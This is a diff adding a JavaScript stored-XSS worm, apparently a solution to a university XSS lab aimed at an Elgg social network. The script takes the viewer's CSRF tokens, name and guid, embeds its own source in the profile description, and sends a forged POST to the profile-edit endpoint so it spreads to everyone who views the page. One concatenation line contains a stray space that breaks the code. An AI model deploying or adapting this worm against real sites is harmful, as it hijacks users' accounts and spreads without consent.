@@ -1,0 +1,54 @@
+//Starting the Scirpt
+<script id='worm' type="text/javascript">
+    //Code to replicate the entire code.
+     var scriptCode = document.getElementById('worm');
+  //Code create the security rokens  _elgg_token  and _elgg_ts as string.
+    var _token=elgg.security.token.__elgg_token;
+    var tok_var = "&__elgg_token=";
+    var send_tok = tok_var.concat(_token);
+    var _ts= elgg.security.token.__elgg_ts;
+    var ts_var = "&__elgg_ts=";
+    var send_ts = ts_var.concat(_ts);
+    //Code to generate name as a string.
+    var _name =elgg.session.user.name;
+    var name_var = "&name=";
+    var send_name = name_var.concat(_name);
+
+    //Code to get hold of the data content. i.e. the description.
+    var _desc = "&description=";
+    var msg = 'Samy is a HERO – Script added by Yash , Ritesh and Ketaki';
+    var start_js = "\<script id='worm'>";
+    var body_js = escape((scriptCode.innerHTML));
+     var end_js = "\<\/script>";
+     var send_desc =(_desc.concat(msg,start_js, body_js, end_js));
+
+     //Code to send the gUiD.
+     var _guid = elgg.session.user.guid;
+     var guid_var = "&guid=";
+     var send_guid = guid_var.concat(_guid);
+     //Code to save the data form after the post request.
+     var _access = "&accesslevel[description]=";
+     var acc_val=2;
+     var send_access = _access.concat(acc_val);
+
+       //code forming the send_data – concating all above strings.
+      var send_data = send_tok.concat(send_ts,s end_name,send_desc,send_guid,send_access);
+   // Sending data in content. – Defining sendURL.
+    var content = send_data;
+    var sendurl = '/action/profile/edit';
+
+//This condition prevents from infected users to modify their own data.
+ if (elgg.session.user.guid != elgg.page_owner.guid) {
+     Ajax = new XMLHttpRequest();
+     Ajax.open("POST", sendurl, true);
+     Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+     Ajax.setRequestHeader("Keep-Alive", "300");
+     Ajax.setRequestHeader("Connection", "keep-alive");
+     Ajax.setRequestHeader("Cookie", document.cookie);
+     Ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+      //POSTING DATA…
+     Ajax.send(content);
+    }
+</script>
+//End Script .
